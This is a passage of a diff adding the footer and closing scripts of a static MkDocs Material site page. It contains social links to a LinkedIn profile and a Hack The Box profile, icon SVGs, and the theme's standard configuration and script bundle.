+    <a href="https://www.linkedin.com/in/jose-raul-bongiovani/" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://app.hackthebox.com/users/1117173" target="_blank" rel="noopener" title="Hack The Box" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224.3-2.5c19.8-11.4 44.2-11.4 64 0L464.2 99c19.8 11.4 32 32.6 32 55.4v203c0 22.9-12.2 44-32 55.4L288.3 514.5a64.16 64.16 0 0 1-64 0L48.5 413c-19.8-11.4-32-32.6-32-55.4v-203c0-22.9 12.2-44 32-55.4zm207.8 360V191.4l-143.8 83v166.1z"/></svg>
+    </a>
+  
+</div>
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.indexes", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
